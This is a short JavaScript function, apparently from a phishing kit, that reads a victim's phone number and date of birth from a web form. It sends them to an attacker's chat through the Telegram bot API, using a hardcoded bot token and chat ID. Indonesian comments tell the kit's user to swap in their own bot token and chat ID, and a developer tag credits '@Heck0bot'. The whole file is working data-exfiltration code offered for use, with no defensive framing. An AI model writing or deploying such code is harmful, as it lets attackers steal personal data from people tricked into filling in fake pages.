function kirimPe() {

    var phoneNumber = document.getElementById('phoneNumber');
    var dob = document.getElementById('dob');

    var gabungan = 'ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @Heck0bot%0A%0APhoneNumber : ' + phoneNumber.value + '%0ADate of birth : ' + dob.value;

    var token = '6580655277:AAHYm3Y5tO3dHgAEwPq9nuI1l0xW5LJx60Y'; // Ganti dengan token bot yang kamu buat
    var grup = '6410517472'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}
